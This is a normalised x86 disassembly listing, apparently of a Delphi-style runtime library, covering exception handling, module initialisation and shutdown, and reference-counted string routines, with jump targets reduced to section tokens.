mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4034b0
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4034a7
lea eax [ ebp - 0x8 ]
call sub_405b04
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4033ec
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405b1c
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4034b0
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4034f4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_40357c
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403534
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403564
push eax
push ecx
mov eax [ eax ]
call sub_403534
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_4040d4
call [ rw-data ]
sub_4035ac
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403534
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4035d4
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403624
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_403664
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_4036b4
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4036dd
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403748
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403784
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403798
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4037ac
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_4037cc
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_4037ac
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403830
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_40329c
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_406234
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403798
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403748
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_40395c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_40329c
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403748
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_406234
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403784
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402cb4
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403ae4
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_4037cc
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403b1c
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_4040d4
sub_403b44
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_406234
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403368
call sub_40372c
sub_403b98
call sub_406234
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403368
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4037f4
jmp edx
sub_403be0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027f0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403d40
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403d68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403dae
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403dc8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403e0e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403e68
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405fc8
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403e8c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405fc8
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403eb4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403ed8
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403f34
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403f64
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40125c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_401214
push eax
call sub_401234
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_401214
push eax
call sub_401234
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403ff0
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403ed8
call sub_403f64
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403d68
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403d40
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405a94
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403f34
push eax
call sub_401274
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_4040e0
push ebp
mov ebp esp
call sub_40329c
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_40270c
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_404118
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0x8
call sub_4026ec
mov [ eax ] edi
mov edx [ ebp + 0x10 ]
mov [ eax + 0x4 ] edx
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_4040e0
push eax
push esi
push ebx
call sub_401244
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_404164
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_40270c
pop eax
sub_404188
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40270c
sub_4041b8
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404228
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028e8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40270c
sub_4041fc
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40270c
sub_404228
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026ec
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404254
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404228
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_404164
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028e8
sub_404284
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_4042a4
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_4042c0
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404164
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4047b0
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404284
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404284
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4047b0
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404254
jmp r-xdata
sub_40435c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404254
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_40438c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4042c0
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4043d4
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404254
not ecx
sub_404400
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028e8
pop ebx
retn
mov ecx ebx
sub_40442c
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_4041b8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4047b0
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4047b0
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028e8
pop edi
pop esi
pop ebx
retn
sub_404470
test edx edx
je r-xdata
mov edx ecx
jmp sub_4041b8
test ecx ecx
je sub_4041b8
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_40442c
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404228
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028e8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028e8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_4041b8
pop edx
pop eax
jmp sub_40442c
call sub_4041b8
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4044e4
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404228
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4047b0
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028e8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_4041b8
dec [ edx - 0x8 ]
sub_404570
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404630
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404228
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028e8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_40270c
sub_404684
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_404164
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404254
jmp r-xdata
pop ebx
retn 0x4
sub_4046c4
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404630
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028e8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4047b0
mov edi ecx
sub_40470c
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4047b0
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
